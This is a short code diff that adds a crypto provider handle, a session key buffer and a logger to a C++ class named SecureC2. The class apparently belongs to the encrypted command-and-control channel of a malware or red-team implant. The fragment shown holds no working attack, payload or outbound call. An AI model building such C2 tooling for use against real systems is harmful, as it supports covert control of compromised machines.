@@ -454,12 +454,15 @@ public:
 // ============================================================================
 class SecureC2 {
 private:
+    HCRYPTPROV hProv;
     HCRYPTPROV hSessionKey;
+    BYTE sessionKey[GCM_256_KEY_SIZE];
     BYTE sessionIV[GCM_256_IV_SIZE];
     SOCKET sock;
     bool connected;
     bool useHttps;
     std::mt19937_64 rng;
+    Logger logger;
     
 public:
     SecureC2(bool https = false) : sock(INVALID_SOCKET), connected(false), useHttps(https) {
